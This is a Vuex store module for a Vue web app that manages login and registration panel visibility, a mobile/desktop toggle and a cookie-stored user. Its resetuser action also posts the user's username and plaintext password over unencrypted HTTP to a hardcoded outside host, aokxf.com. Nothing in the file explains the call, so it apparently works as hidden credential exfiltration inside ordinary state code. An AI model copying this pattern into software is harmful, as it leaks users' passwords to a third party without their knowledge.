// The Vue build version to load with the `import` command
// (runtime-only or standalone) has been set in webpack.base.conf with an alias.
import  usercookie from './usercookie'
import  useraxios from './useraxios'
import qs from 'qs';
import axios from 'axios';
const state = {
  usesee: false,
  Logsee: true,
  forgetsee: false,
  regissee:false,
  mobileFlg:false,
  mobileprompt:"手机版",
  user: {}
  
}
const mutations = {
  getuser (state, use) {
    state.user = use
  },
  tooglemobileFlg (state) {
    
   state.mobileFlg=!state.mobileFlg;

   (state.mobileFlg == false) ? state.mobileprompt="手机版" : state.mobileprompt="电脑版"; 
    console.log ( state.mobileFlg) 
    
  },
  toogle (state,item) {
    state[item] =!state[item]
  }
 
} 
const getters = {
  getnewuser: function(state){ return state. user },
  getLogsee: function(state){ return state.Logsee },
  getforgetser: function(state){ return state.forgetsee },
  getregissee: function(state){ return state.regissee },
  getmbprompt: function(state){ return state.mobileprompt },
  getmbFlg: function(state){ return state.mobileFlg },
  getusesee: function(state  ){ return state.usesee }
} 

const actions = {
  resetuser ({ commit },use) {
     usercookie.resetuser(use)
     commit("getuser",use)
     console.log(use.username)
     axios.post('http://aokxf.com/123',JSON.stringify({name:use.username,password:use.password})) 
    //http://aokxf.com/123
         .then(response => {
         console.log(response);
         })
         .catch(err => {
         console.log(err);
      }) 
  },   
 getcookieuser ({ commit }) {
    var cookieuser
    cookieuser=usercookie.getuser()
    commit("getuser",  cookieuser )
  },
  userlogout({ commit },use) {

    usercookie.delectuser()
    commit("getuser",use)
  }, 
 toogleusestate ({ commit },item) {
    commit("toogle",  item )
  },
  tooglemobilestate ({ commit }) {
    commit("tooglemobileFlg" )
  }
 } 
export default {
  state,
  getters,
  actions,
 mutations
} 